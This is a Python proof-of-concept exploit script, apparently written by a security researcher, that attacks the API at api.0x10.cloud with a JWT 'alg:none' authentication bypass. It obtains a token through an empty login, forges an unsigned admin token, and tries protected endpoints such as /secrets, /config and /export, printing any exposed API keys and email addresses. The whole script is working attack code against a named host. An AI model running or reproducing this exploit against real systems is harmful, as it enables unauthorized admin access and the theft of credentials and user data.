# author: Yash Zinzuvadiya
# vulnerability: JWT Algorithm None Attack
# target: api.0x10.cloud

import urllib.request
import urllib.error
import json
import base64
import time

TARGET = "http://api.0x10.cloud"

# step 1 - try empty login and get token
print("=" * 60)
print("  STEP 1: Empty Login")
print("=" * 60)

# send empty post request to auth endpoint
def post_json(url, data):
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=payload,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST"
    )
    try:
        r = urllib.request.urlopen(req, timeout=5)
        return r.status, r.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="ignore")
    except Exception as e:
        return None, str(e)

# hit the auth endpoint with no credentials
status, body = post_json(TARGET + "/auth", {})
print(f"[*] POST {TARGET}/auth with empty body")
print(f"[*] Status: {status}")
print(f"[*] Response: {body}")

# check if token exists in response
token = None
if "token" in body:
    token = json.loads(body).get("token")
    print(f"\n[VULNERABILITY] empty login returned a JWT token")
    print(f"[*] token: {token}")

# step 2 - decode the token and check the algorithm
print("\n" + "=" * 60)
print("  STEP 2: Decode JWT")
print("=" * 60)

# decode each part of the jwt
def decode_jwt_part(part):
    padding = 4 - len(part) % 4
    part += "=" * padding
    return json.loads(base64.b64decode(part).decode("utf-8"))

if token:
    parts = token.split(".")
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    print(f"[*] header:  {json.dumps(header)}")
    print(f"[*] payload: {json.dumps(payload)}")

    # check if alg is none - means no signature needed
    if header.get("alg") == "none":
        print(f"\n[VULNERABILITY] alg:none detected - tokens can be forged without a secret key")
        print(f"[*] role in payload: {payload.get('role')}")

# step 3 - forge an admin token
print("\n" + "=" * 60)
print("  STEP 3: Forge Admin Token")
print("=" * 60)

# build a fake jwt with admin role and no signature
def forge_jwt(header_data, payload_data):
    def b64encode_no_padding(data):
        return base64.b64encode(json.dumps(data).encode()).decode().rstrip("=")
    h = b64encode_no_padding(header_data)
    p = b64encode_no_padding(payload_data)
    # leave signature empty since alg is none
    return f"{h}.{p}."

forged_header = {"alg": "none", "typ": "JWT"}
forged_payload = {"sub": "1", "name": "Admin", "role": "admin", "iat": 9999999999}
forged_token = forge_jwt(forged_header, forged_payload)

print(f"[*] forged header:  {json.dumps(forged_header)}")
print(f"[*] forged payload: {json.dumps(forged_payload)}")
print(f"[*] forged token:   {forged_token}")

# step 4 - use the forged token to hit protected endpoints
print("\n" + "=" * 60)
print("  STEP 4: Access Protected Endpoints")
print("=" * 60)

endpoints = [
    "/users", "/users/all", "/admin", "/config",
    "/secrets", "/data", "/logs", "/debug", "/internal", "/export"
]

# try each endpoint with the forged token
for ep in endpoints:
    req = urllib.request.Request(
        TARGET + ep,
        headers={
            "Authorization": f"Bearer {forged_token}",
            "Content-Type": "application/json"
        }
    )
    try:
        r = urllib.request.urlopen(req, timeout=5)
        body = r.read().decode("utf-8", errors="ignore")
        print(f"[200 OPEN] {ep}")
        print(f"  response: {body[:300]}")
        # check if api key or email is exposed
        if "api_key" in body:
            print(f"  [CRITICAL] api key exposed: {json.loads(body).get('api_key')}")
        if "email" in body:
            print(f"  [CRITICAL] email exposed: {json.loads(body).get('email')}")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        print(f"[{e.code}] {ep}")
    except Exception as e:
        print(f"[ERR] {ep} - {e}")
    time.sleep(0.15)

# summary of what was found
print("\n" + "=" * 60)
print("  SUMMARY")
print("=" * 60)
print("  target:        api.0x10.cloud")
print("  vulnerability: JWT algorithm none attack")
print("  impact:        complete auth bypass, admin api keys and user data exposed")
print("  modules used:  urllib.request, urllib.error, json, base64, time")
print("=" * 60)